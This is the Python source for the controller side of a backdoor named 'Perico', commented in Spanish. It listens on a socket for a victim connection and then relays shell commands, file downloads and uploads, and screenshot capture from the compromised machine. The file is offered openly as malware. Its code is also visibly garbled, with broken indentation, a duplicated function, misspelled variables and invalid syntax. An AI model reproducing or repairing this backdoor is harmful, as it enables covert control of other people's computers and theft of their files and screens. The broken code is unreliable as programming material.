#***************************************************************************#
# Perico backdoor : ver 3.6.1 -                                             *
# Author : Bruno A. Diaz                                                    *
# Blackhat : Arsenal Edition                                                *
# OS: BlackArch                                                             *
#***************************************************************************#


#!/usr/bin/env python
#_*_ coding: utf8 _*_
# Servidor socket en pyhton, PericoTx backdoor
#
import socket
import base64


 def ascii_art():
    print("    ___           __      __              ")
    print("   / _ )___ _____/ /_____/ /__  ___  ____ ")
    print("  / _  / _ `/ __/  '_/ _  / _ \/ _ \/ __/ ")
    print(" /____/\_,_/\__/_/\_\\\\_,_/\___/\___/_/  ")

 def ascii_art():
    print("   @@@@@   @@@@@@ @@@@@@@ @@@@@@@   @@@  @@@   @@@  ")
    print("  @@  @@@ !@@       @!!   @@!  @@@  @@!  @@!   !@@  ")
    print("  @@! @@@ !@@       @!!   @@!  @@@  @@!   !@@!@!    ")
    print("  @!@!@!@! !@@!!    !!:   @!@!!@!   !!@    !::!!    ")
    print("  !!:  !!!    !:!   !!:   !!: :!!   !!:   !: :!!    ")
    print("   :   !!!     :     :    !!: :!!   !!:  :::  :::   ")
    print("   :   : :::.: :     :     :    ::   :  :::    :::  ")

 def shell():
   current_dir = target.recv(1024)
   count = 0
   while True:
   comando = raw_input("{}~#: ".format(current_dir))
   if comando == "exit":
      target.send(comando)
      break
   elif comando[:2] == "cd":
      target.send(comando)
      res = target.recv(1024)
      current_dir = res
      print(res)
   elif comando == "":
      pass
   elif comando[:8] == "download":
        target.send(comando)
    with open(comando[9:], 'wb') as file_download:
        datos = taget.recv(60000)
        file_download.write(base64.b64decode(datos))

   elif comando[:6] == "upload":
     try:
        target.send(comando)
        with open(res[7:],'rb') as file_upload:
        target.send(base64.b64encode(file_upload.read()))
      except:
         print("Ocurrio un error en la subida...?")
   elif comando[:10] == "screenshot":
        target.send(comando)
       with open("monitor-%d.png", % count, 'wb') as screen:
        datos = target.recv(1000000)
        data_decode = base64.b64decode(datos)
    if data_decode == "fail":
       print("Error en la captura de pantalla...?")
     else:
       screen.write(data_decode)
       print("Captura tomada con exito...!")
       count = count + 1
     else:
        target.send(comando)
        res = target.recv(60000)
     if res == "1":
        continue
     else:
        print(res)

  def upserver():
    global server
    global ip
    global target

  server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  server.bind(('127.0.0.1', 7777))
  server.listen(1)

  print("Corriendo servidor y esperando conexiones...!")

  target, ip = server.accept()
  print("Conexion recibidas de: " + str(ip[0]))

  upserver()
  shell()
  server.close()

